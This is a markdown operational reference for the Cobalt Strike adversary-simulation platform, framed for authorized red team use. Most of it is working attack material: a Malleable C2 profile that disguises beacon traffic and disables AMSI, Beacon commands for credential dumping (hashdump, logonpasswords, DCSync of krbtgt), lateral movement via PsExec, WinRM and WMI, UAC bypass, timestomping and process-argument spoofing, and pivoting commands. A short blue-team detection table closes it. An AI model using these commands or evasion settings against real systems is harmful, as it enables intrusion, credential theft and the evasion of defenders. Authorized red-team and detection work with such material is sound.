# Cobalt Strike Reference (Authorized Use Only)

## Purpose

Operational reference for Cobalt Strike, the commercial adversary simulation platform. This document is strictly for authorized red team operations with explicit written engagement authorization. Covers Malleable C2 profiles, Beacon operations, lateral movement techniques, and OPSEC tradecraft.

## Legal and Ethical Framework

**This tool must only be used with:**
- Written authorization from asset owner
- Defined scope and rules of engagement
- Incident response team notification
- Legal review of engagement contract

## Architecture Overview

### Components

| Component | Function |
|-----------|----------|
| Team Server | Central server managing operations, listeners, and data |
| Client | Operator GUI connecting to Team Server |
| Beacon | Implant running on target systems |
| Listener | Handler for Beacon callbacks |
| Malleable C2 | Profile system for traffic customization |

### Listener Types

| Type | Use Case |
|------|----------|
| HTTP/HTTPS | Standard web-based C2 (most common) |
| DNS | Low-and-slow, bypasses web filtering |
| SMB | Peer-to-peer, internal pivoting without egress |
| TCP | Bind/reverse for internal lateral movement |
| External C2 | Custom transport via third-party tools |

## Malleable C2 Profiles

### Profile Structure

```
# Example Malleable C2 profile (simplified)
set sleeptime "60000";            # 60 second callback interval
set jitter "30";                  # 30% jitter (42-78 seconds)
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set host_stage "false";           # Disable staging (OPSEC)

https-certificate {
    set CN "www.legitimate-domain.com";
    set O "Legitimate Corp";
    set validity "365";
}

http-get {
    set uri "/api/v1/status /api/v1/health";
    client {
        header "Accept" "application/json";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json";
        header "Cache-Control" "no-cache";
        output {
            base64url;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}

http-post {
    set uri "/api/v1/submit";
    client {
        header "Content-Type" "application/json";
        id {
            base64url;
            prepend "{\"id\":\"";
            append "\",\"data\":\"";
        }
        output {
            base64url;
            append "\"}";
            print;
        }
    }
    server {
        output {
            print;
        }
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "mojo.5688.8052.##########";
}

process-inject {
    set min_alloc "17500";
    set userwx "false";
    set startrwx "false";
    set allocator "NtMapViewOfSection";
    transform-x64 {
        prepend "\x90\x90";
    }
}
```

### Profile Validation

```bash
# Always validate before deployment
./c2lint profile.profile
```

## Beacon Operations

### Initial Access

| Delivery Method | Description |
|----------------|-------------|
| Scripted Web Delivery | Host payload on Team Server, deliver via PowerShell/wget |
| HTML Application (HTA) | Browser-based execution |
| Office Macro | VBA payload in Word/Excel documents |
| USB/Physical | HID attacks, removable media |
| Staged vs Stageless | Stager downloads beacon vs full payload in one |

### Core Beacon Commands

```
# Situational awareness
whoami                            # Current user context
pwd / ls                          # File system navigation
ps                                # Process listing
net view                          # Network shares
net computers                     # Domain computers

# Credential operations
hashdump                          # SAM dump (requires admin)
logonpasswords                    # Mimikatz sekurlsa::logonpasswords
dcsync domain.local DOMAIN\krbtgt # DCSync for golden ticket material
make_token DOMAIN\user password   # Create token with credentials

# Lateral movement
jump psexec target listener       # PsExec beacon deployment
jump winrm target listener        # WinRM beacon deployment
jump wmi target listener          # WMI beacon deployment
remote-exec psexec target command # Execute command only

# Privilege escalation
elevate svc-exe listener          # Service-based escalation
elevate uac-token-duplication listener  # UAC bypass
runasadmin                        # Run as admin via known techniques

# File operations
upload /local/path                # Upload file
download C:\target\path           # Download file
timestomp target.exe source.exe   # Match timestamps (anti-forensics)
```

### OPSEC-Critical Settings

```
# Sleep and jitter (avoid predictable callbacks)
sleep 60 30                       # 60 seconds, 30% jitter

# Process injection (avoid suspicious processes)
spawnto x64 %windir%\sysnative\dllhost.exe
spawnto x86 %windir%\syswow64\dllhost.exe

# Use argue to spoof process arguments
argue cmd.exe /c ipconfig         # Shows this in process list
# Actual execution is different
```

## Pivoting

### SOCKS Proxy

```
socks 1080                        # Start SOCKS4a proxy on team server
# Route external tools through proxy
proxychains nmap -sT target
```

### SMB Beacon Chains

```
# Deploy SMB beacon for peer-to-peer C2
# Parent beacon forwards traffic through named pipe
link target \\.\pipe\pipename
# Creates chain: Team Server <- HTTPS Beacon <- SMB Beacon
```

### Reverse Port Forward

```
rportfwd 8080 internal_target 80  # Forward team server 8080 to internal:80
rportfwd_local 8080 127.0.0.1 80  # Forward through beacon operator client
```

## Detection and Blue Team Awareness

| Artifact | Detection Method |
|----------|-----------------|
| Named pipes | Sysmon Event ID 17/18 |
| Service creation | Event ID 7045 |
| Process injection | Sysmon Event ID 8 (CreateRemoteThread) |
| Encoded PowerShell | Event ID 4104 (Script Block Logging) |
| Network callbacks | JA3/JA3S fingerprinting, beacon timing analysis |
| Memory artifacts | In-memory scanning for reflective DLL patterns |

## Cross-References

- See `reference/tools/metasploit-reference.md` for alternative exploitation framework
- See `reference/tools/bloodhound-reference.md` for AD path analysis feeding operations
- See `frameworks/offense-layer.md` for offensive methodology alignment
- See `frameworks/red-team-maturity-model.md` for operational maturity assessment
- See `frameworks/persistence-analysis-methodology.md` for persistence techniques
